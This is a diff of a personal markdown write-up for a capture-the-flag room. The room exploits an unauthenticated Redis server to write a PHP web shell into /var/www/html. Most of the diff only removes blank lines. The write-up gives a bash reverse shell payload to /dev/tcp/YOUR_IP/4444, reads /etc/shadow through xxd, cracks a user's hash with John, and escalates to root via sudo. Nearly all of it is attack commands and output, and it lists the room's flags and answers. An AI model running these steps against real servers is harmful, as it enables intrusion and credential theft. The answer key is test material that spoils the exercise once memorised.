@@ -42,7 +42,6 @@ zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.252.13
 
 https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
 
-
 ┌──(kali㉿kali)-[~]
 └─$ redis-cli -h 10.10.252.133           
 10.10.252.133:6379> info
@@ -207,7 +206,6 @@ To achieve RCE we need to know the web directory, so we can initially assume tha
 
 Using the above as a POC, we can try writing our RCE:
 
-
 10.10.252.133:6379> config set dir /var/www/html
 OK
 10.10.252.133:6379> config set dbfilename redis.php
@@ -216,7 +214,6 @@ OK
 OK
 10.10.252.133:6379> save
 OK
-
 
 going to http://10.10.252.133/redis.php
 
@@ -243,7 +240,6 @@ view-source:http://10.10.252.133/redis.php?cmd=%20cat%20/etc/passwd
 
 vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
 
-
 And there we go, we have the full contents of the /etc/passwd file on the screen and again we can see that we have a user vianka. All we need to do now is setup a listener and create a script to run a simple reverse php shell.
 
 To do this I will do the same as above in redis-cli, but we will set test to run the following php reverse shell script.
@@ -251,7 +247,6 @@ To do this I will do the same as above in redis-cli, but we will set test to run
 "<?php exec("/bin/bash -c 'bash -i > /dev/tcp/YOUR_IP/4444 0>&1'"); ?>"
 
 One important point here is that we will need to escape the set test “….” quotes from the php shell script, so we will need to modify our shell code as follows:
-
 
 10.10.252.133:6379> config set dir /var/www/html
 OK
@@ -345,7 +340,6 @@ messagebus:*:18506:0:99999:7:::
 uuidd:*:18506:0:99999:7:::
 vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
 
-
 www-data@ubuntu:/home/vianka$ xxd "/etc/passwd" | xxd -r
 xxd "/etc/passwd" | xxd -r
 root:x:0:0:root:/root:/bin/bash
@@ -376,13 +370,11 @@ messagebus:x:106:110::/var/run/dbus:/bin/false
 uuidd:x:107:111::/run/uuidd:/bin/false
 vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
 
-
 johnripper 
 
 To do this we need to create two files, one with the contents of the passwd file and one with the hash of the shadow file, we only need to copy and paste the information for user Vianka. We can then use the ‘unshadow’ command to convert the hash to a format that is readable by John.
 
 unshadow passwd.txt shadow.txt > hash.txt
-
 
 ┌──(kali㉿kali)-[~]
 └─$ mkdir res      
@@ -411,7 +403,6 @@ beautiful1       (vianka)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
-
 su
 
 vianka:beautiful1
@@ -430,7 +421,6 @@ Matching Defaults entries for vianka on ubuntu:
 
 User vianka may run the following commands on ubuntu:
     (ALL : ALL) ALL
-
 
 vianka@ubuntu:~$ sudo -l
 sudo -l
@@ -456,13 +446,9 @@ root@ubuntu:~# tac root.txt
 tac root.txt
 thm{xxd_pr1v_escalat1on}
 
-
-
 ```
 
 ![](https://miro.medium.com/max/720/1*e8fK3nV_YPwP_185WZI5Dg.png)
-
-![[Pasted image 20220926223435.png]]
 
 Scan the machine, how many ports are open?
 *2*
@@ -479,12 +465,10 @@ Compromise the machine and locate user.txt
 What directory can you write to? Apache?
 *thm{red1s_rce_w1thout_credent1als}*
 
-
 What is the local user account password?
 *beautiful1*
 
 Escalate privileges and obtain root.txt
 *thm{xxd_pr1v_escalat1on}*
-
 
 [[Phishing Emails 5]]
